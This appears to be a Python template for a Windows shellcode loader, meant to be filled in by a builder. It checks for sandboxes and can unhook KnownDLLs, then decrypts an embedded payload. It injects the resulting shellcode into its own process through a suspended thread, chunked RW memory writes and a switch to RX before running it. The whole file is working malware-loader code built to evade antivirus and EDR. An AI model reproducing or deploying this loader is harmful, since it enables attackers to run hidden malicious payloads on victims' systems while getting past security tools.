import sys
import time
import ctypes
import ctypes.wintypes as wintypes
from ctypes import byref

import base64
import binascii
import codecs
import gzip
import bz2
import lzma
import zlib
import psutil

from Crypto.Cipher import ARC4, AES, ChaCha20, Salsa20
from Crypto.Util.Padding import unpad

from console import print_status, print_step, print_success, print_error, print_hex
from evasion import sandbox_evasion, overwrite_knowndlls
from utils import *

DEBUG = "__DEBUG__" == "1"

# {{DECRYPTION_FUNCTION}}


def execute_shellcode(shellcode):

    print_status("Shellcode Injection")

    process_handle = kernel32.GetCurrentProcess()
    chunk_size = 4096
    shellcode_size = len(shellcode)
    num_chunks = shellcode_size // chunk_size

    if shellcode_size % chunk_size != 0:
        num_chunks += 1

    total_size = SIZE_T(num_chunks * chunk_size)
    base_address = wintypes.LPVOID()

    print_step(f"Reserving {total_size.value} bytes")
    ntdll.NtAllocateVirtualMemory(
        process_handle,
        byref(base_address),
        0,
        byref(total_size),
        MEM_RESERVE,
        PAGE_NOACCESS,
    )
    print_step(f"Base: {print_hex(base_address.value)}")

    thread = wintypes.HANDLE()
    cid = CLIENT_ID()

    print_step("Creating suspended thread")
    ntdll.RtlCreateUserThread(
        process_handle,
        None,
        True,
        0,
        0,
        0,
        base_address,
        None,
        byref(thread),
        byref(cid),
    )

    time.sleep(2)

    print_step(f"Writing {num_chunks} chunks (RW):")

    for i in range(num_chunks):
        start = i * chunk_size
        end = min(start + chunk_size, shellcode_size)
        chunk = shellcode[start:end]

        addr = wintypes.LPVOID(base_address.value + (i * chunk_size))
        size = SIZE_T(chunk_size)

        ntdll.NtAllocateVirtualMemory(
            process_handle, byref(addr), 0, byref(size), MEM_COMMIT, PAGE_READWRITE
        )

        print(f"    [+] Chunk {i+1}/{num_chunks} @ {print_hex(addr.value)}")

        ctypes.memmove(addr, chunk, len(chunk))

    print_step("Setting permissions (RX):")

    for i in range(num_chunks):
        addr = wintypes.LPVOID(base_address.value + (i * chunk_size))
        size = SIZE_T(chunk_size)
        old = wintypes.ULONG()

        ntdll.NtProtectVirtualMemory(
            process_handle, byref(addr), byref(size), PAGE_EXECUTE_READ, byref(old)
        )

        print(f"    [+] Chunk {i+1}/{num_chunks} @ {print_hex(addr.value)}")

    print_success("Injection complete")

    print_status("Executing Payload")
    print_step("Resuming thread")
    kernel32.ResumeThread(thread)

    if DEBUG:
        kernel32.WaitForSingleObject(thread, -1)


if __name__ == "__main__":

    if not sandbox_evasion(
        __TIME_DELAY__, __CPU_CHECK__, __RAM_CHECK__, __UPTIME_CHECK__, __PROC_CHECK__
    ):
        sys.exit(1)

    if "__UNHOOK__" == "1":
        overwrite_knowndlls()

    print()

    print_status("Decrypting Payload")
    key = b'{{__KEY__}}'
    payload_chunks = __PAYLOAD__
    encoded_payload = "".join(payload_chunks).encode()

    try:
        print_step("Decrypting...")
        shellcode = decode_and_decompress(encoded_payload, key)
        print_success(f"Decrypted {len(shellcode)} bytes")
    except Exception as e:
        print_error(f"Decryption failed: {e}")
        sys.exit(1)

    print()

    execute_shellcode(shellcode)
